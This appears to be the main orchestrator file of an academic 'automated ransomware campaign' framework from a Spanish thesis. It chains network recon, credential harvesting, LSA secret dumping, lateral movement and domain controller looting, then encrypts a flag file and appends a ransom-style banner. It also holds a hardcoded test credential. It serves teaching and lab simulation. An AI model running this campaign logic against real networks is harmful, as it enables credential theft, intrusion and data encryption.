# odin.py

import os
import config

from state import State
from modules import heimdall
from modules import skadi
from modules import thor
from modules import loki
from modules import mimir
from utils import ratatoskr as log
from utils import bifrost

from cryptography.fernet import Fernet

BANNER = r"""
     ████   ███   ███  █   █  ███  ████   ███  █   █
     █░░░█ █ ░░█ █ ░░░ ██  █░█ ░░█ █░░░█ █ ░░█ █░ █ ░
     ████░░█████░█░ ██░█░█ █░█████░████░░█░ ░█░███ ░ ░
     █░░█░ █░░░█░█░░ █░█░░██░█░░░█░█░░█░ █░░ █░█░░█ ░
     █░░░█░█░░░█░░███ ░█░░ █░█░░░█░█░░░█░ ███ ░█░░░█
      ░░  ░ ░░  ░░ ░░░ ░░░  ░░░░  ░░░░  ░  ░░░ ░░░  ░
       ░   ░ ░   ░  ░░░  ░   ░ ░   ░ ░   ░  ░░░  ░   ░

                           ~.
                    Ya...___|__..aab     .   .
                     Y88a  Y88o  Y88a   (     )
                      Y88b  Y88b  Y88b   `.oo'
                      :888  :888  :888  ( (`-'
             .---.    d88P  d88P  d88P   `.`.
            / .-._)  d8P'"''"|"'"'-Y8P     `.`.
           ( (`._) .-.  .-. |.-.  .-.  .-.   ) )
            \ `---( O )( O )( O )( O )( O )-' /
             `.    `-'  `-'  `-'  `-'  `-'  .' 
         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ---------------------------------------------------------
             Automated Ransomware Campaign Framework
                 Author: Bruno Paniagua García
    ---------------------------------------------------------
"""

# Traduccion de codigos internos a texto presentable para la memoria del TFG.
METHODS = {
    "Nmap":     "Nmap Fingerprinting",
    "Services": "Deteccion por servicios",
    "TTL":      "Analisis de TTL",
}

# Un host con Kerberos (88) y LDAP (389) abiertos es un Domain Controller.
DC_PORTS = {88, 389}


def _is_domain_controller(host):
    open_ports = {p["puerto"] for p in host.ports}
    return DC_PORTS.issubset(open_ports)


def _recon_subnet(state, subnet):
    """Barre una subred y registra los hosts nuevos (ignora infra conocida)."""
    log.info(f"Barriendo el ambito {subnet} ...", tag="HEIMDALL")
    for h in heimdall.discovery(subnet):
        if h.ip in config.IGNORED_IPS or h.ip in state.hosts:
            continue
        state.register(h)
        method = METHODS.get(h.os_method, h.os_method)
        log.success(f"Host descubierto: {h.ip}  ->  {h.so}  (via {method})", tag="HEIMDALL")
        for p in h.ports:
            log.info(f"    {p['puerto']}/tcp  {p['servicio']}", tag="ODIN")


def _encrypt_flag(state):
    dc = next(
        (
            h for h in state.hosts.values()
            if h.compromised and _is_domain_controller(h)
        ),
        None
    )

    if not dc or not state.flag_path:
        return

    # 1. Preparación del directorio de claves
    keys_path = "keys"

    if not os.path.exists(keys_path):
        log.debug(f"Creando carpeta de claves en: {keys_path}")
        os.makedirs(keys_path, exist_ok=True)
        log.info(f"Carpeta '{keys_path}' creada correctamente", tag="ODIN")
    else:
        log.debug(f"Carpeta de claves detectada en '{keys_path}'")

    key_file_path = os.path.join(keys_path, "TFG_key.key")

    # 2. Generación y almacenamiento de la clave
    log.debug("Generando nueva clave Fernet...")

    key = Fernet.generate_key()

    with open(key_file_path, "wb") as key_file:
        key_file.write(key)

    log.success(
        f"Clave generada y guardada en '{key_file_path}'", tag="LOKI"
    )

    # 3. Lectura y cifrado de la flag
    flag_path = state.flag_path

    log.debug(
        f"FLAG objetivo recibida desde state: {flag_path}"
    )

    try:
        log.info(
            f"Leyendo contenido de '{flag_path}'...", tag="ODIN"
        )

        original_content = dc.access.read_file(flag_path)

        if original_content is None:
            log.error(
                f"No se pudo leer '{flag_path}' en el DC.", tag="LOKI"
            )
            return

        log.debug(
            f"Encriptando {len(original_content)} bytes..."
        )

        encrypted_content = Fernet(key).encrypt(original_content)

        flag_banner = (
                "\n\n"
                " =====================================================================\n"
                "            ████   ███   ███  █   █  ███  ████   ███  █   █\n"
                "            █░░░█ █ ░░█ █ ░░░ ██  █░█ ░░█ █░░░█ █ ░░█ █░ █ ░\n"
                "            ████░░█████░█░ ██░█░█ █░█████░████░░█░ ░█░███ ░ ░\n"
                "            █░░█░ █░░░█░█░░ █░█░░██░█░░░█░█░░█░ █░░ █░█░░█ ░\n"
                "            █░░░█░█░░░█░░███ ░█░░ █░█░░░█░█░░░█░ ███ ░█░░░█\n"
                "             ░░  ░ ░░  ░░ ░░░ ░░░  ░░░░  ░░░░  ░  ░░░ ░░░  ░\n"
                "              ░   ░ ░   ░  ░░░  ░   ░ ░   ░ ░   ░  ░░░  ░   ░\n"
                " =====================================================================\n"
                "\n"
                " ------------------- ¡El archivo ha sido encriptado! -------------------\n"
                "-- Esto es una simulación controlada desarrollada con fines académicos --\n"
                "\n"
                "                                  ~.\n"
                "                           Ya...___|__..aab     .   .\n"
                "                            Y88a  Y88o  Y88a   (     )\n"
                "                             Y88b  Y88b  Y88b   `.oo'\n"
                "                             :888  :888  :888  ( (`-'\n"
                "                     .---.   d88P  d88P  d88P   `.`.\n"
                "                    / .-._) d8P'\"''\"|\"''\"-Y8P     `.`.\n"
                "                   ( (`._) .-.  .-. |.-.  .-.  .-.  ) )\n"
                "                   \\ `---( O )( O )( O )( O )( O )-' /\n"
                "                     `.    `-'  `-'  `-'  `-'  `-'  .'\n"
                "                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
                "  ------------------ TFG Author: Bruno Paniagua García ------------------\n"
                "--------------- TFG Supervisor: José Antonio Gómez Hernández ---------------\n"
        ).encode("utf-8")

        encrypted_content += flag_banner

        if not dc.access.write_file(
            flag_path,
            encrypted_content
        ):
            log.error(
                f"No se pudo reescribir '{flag_path}' en el DC.",tag="LOKI"
            )
            return

        log.success(
            f"Archivo '{flag_path}' encriptado correctamente", tag="LOKI"
        )

    except Exception as e:
        log.error(
            f"Error inesperado al procesar "
            f"'{flag_path}': {e}", tag="LOKI"
        )


def main():
    print(BANNER)

    state = State()

    # --- Punto de partida: PC_RRHH ya vulnerado (ClickFix) ---
    # Foothold no-admin (hrmanager): se lootea en local, sin C$.
    state.mark_compromised(config.IP_INITIAL_FOOTHOLD, access=bifrost.local_access())
    state.hosts[config.IP_INITIAL_FOOTHOLD].so = "Windows"   # SO conocido del foothold
    log.success(f"Foothold inicial establecido en {config.IP_INITIAL_FOOTHOLD} (PC_RRHH)", tag="ODIN")

    # --- TEMPORAL (prueba funcional): simula el loot local de PC_RRHH ---
    from state import CredentialCandidate
    state.credentials.append(CredentialCandidate(
        username="ithelp", secret="H3lpD3sk!2024",
        source="seed_pcrrhh", location="PC_RRHH",
        evidence="siembra prueba funcional",
    ))
    log.success("Foothold establecido en PC_RRHH via ClickFix (hrmanager) - credenciales locales recolectadas", tag="SKADI")

    swept = set()   # subredes ya barridas (no repetir recon)

    # ==================================================================
    # BUCLE DE CAMPAÑA
    # Itera host a host: recon -> loot -> (¿DC? flag) -> salto lateral.
    # Se detiene al capturar la flag o cuando no quedan hosts que exprimir.
    # ==================================================================
    while state.flag is None:
        host = state.next_pending()
        if host is None:
            break

        log.info(f"===== Explotando {host.ip} =====", tag="ODIN")

        # --- FASE 1: RECON (Heimdall) sobre las subredes en alcance ---
        for subnet in config.SUBNETS:
            if subnet not in swept:
                with log.timer(f"-> {subnet}", tag="HEIMDALL"):
                    _recon_subnet(state, subnet)
                swept.add(subnet)

        # --- FASE 4: ¿es el DC? -> Loki lootea y revela la flag ---
        # (va antes que Skadi: en el DC, Loki ya recolecta ficheros)
        if _is_domain_controller(host):
            log.success(f"{host.ip} identificado como Domain Controller (puertos 88+389)", tag="LOKI")
            result = loki.loot(host.access)

            log.info(f"Loki recolecto {len(result['critical_files'])} fichero(s) critico(s):", tag="ODIN")
            for f in result["critical_files"]:
                marca = "   <-- CONTIENE FLAG" if f["has_flag"] else ""
                log.info(f"    {f['path']}{marca}", tag="ODIN")
                log.info(f"        {f['preview']}", tag="ODIN")

            if result["flag"]:
                state.flag = result["flag"]
                state.flag_path = result["flag_path"]
                log.success(f"FLAG capturada: {result['flag']}", tag="LOKI")
            else:
                log.error(f"DC comprometido pero Loki no encontro la flag en {host.ip}", tag="LOKI")

            host.exploited = True
            continue

        # --- FASE 2a: RECOLECCION (Skadi) sobre este host ---
        if host.access is not None:
            log.info(f"Skadi cazando credenciales en {host.ip} ...", tag="ODIN")
            with log.timer(f"-> {host.ip}", tag="SKADI"):
                hunt = skadi.credential_hunt(host.access)
            if hunt["status"] == "success":
                state.credentials.extend(hunt["candidates"])
                log.success(
                    f"Encontro {len(hunt['candidates'])} candidata(s) "
                    f"en: {', '.join(hunt['sources'])}", tag="SKADI"
                )
                for c in hunt["candidates"]:
                    user = c.username or "(sin usuario)"
                    log.info(f"    {user} : {c.secret}  [{c.source}]  {c.location}", tag="ODIN")
            else:
                log.info(f"Skadi no encontro credenciales en {host.ip}", tag="ODIN")

        # --- FASE 2b: VOLCADO LSA (Mimir) solo en hosts con acceso admin SMB ---
        if isinstance(host.access, bifrost.SmbAccess):
            log.info(f"Mimir volcando secretos LSA en {host.ip} ...", tag="ODIN")
            with log.timer(f"-> {host.ip}", tag="MIMIR"):
                dump = mimir.dump_credentials(host.access)
            if dump["status"] == "success":
                state.credentials.extend(dump["candidates"])
                log.success(f"Recupero {len(dump['candidates'])} credencial(es)", tag="MIMIR")
                for c in dump["candidates"]:
                    valor = c.secret if c.secret else f"NT:{c.nt_hash}"
                    log.info(f"    {c.username} : {valor}  [{c.source}]", tag="ODIN")
            elif dump["status"] == "error":
                log.warning(f"Mimir no pudo volcar en {host.ip}: {dump['error']}", tag="ODIN")
            else:
                log.info(f"Mimir no recupero credenciales en {host.ip}", tag="ODIN")

        # --- FASE 3: MOVIMIENTO LATERAL (Thor) contra vecinos no comprometidos ---
        for target in list(state.hosts.values()):
            if target.compromised or target.so != "Windows":
                continue
            log.info(f"Thor intentando movimiento lateral -> {target.ip} ...", tag="ODIN")
            with log.timer(f"-> {target.ip}", tag="THOR"):
                res = thor.lateral_move(state.credentials, target.ip)
            if res["status"] == "success":
                state.mark_compromised(target.ip, access=res["access"])
                valor = res["secret"] if res["secret"] else f"NT:{res['nt_hash']}"
                log.success(f"Acceso a {target.ip} con {res['username']}:{valor} "
                            f"(dominio '{res['domain']}', intento #{res['attempts']})", tag="THOR")
            elif res["status"] == "unreachable":
                log.warning(f"{target.ip} no alcanzable (445 cerrado), se omite", tag="ODIN")
            else:
                log.info(f"Sin acceso a {target.ip} ({res['attempts']} intentos)", tag="ODIN")

        host.exploited = True

    # ==================================================================
    # CIERRE
    # ==================================================================
    if state.flag:
        log.success(f"Campaña completada: DC comprometido y flag capturada -> {state.flag}", tag="ODIN")
        _encrypt_flag(state)
    elif any(h.compromised and _is_domain_controller(h) for h in state.hosts.values()):
        log.warning("DC comprometido pero la flag no se encontro "
                    "(¿esta plantada en una ruta de Loki?).", tag="ODIN")
    else:
        log.warning("Campaña detenida: no se alcanzo el DC "
                    "(sin credenciales validas para el siguiente salto).", tag="ODIN")


if __name__ == "__main__":
    main()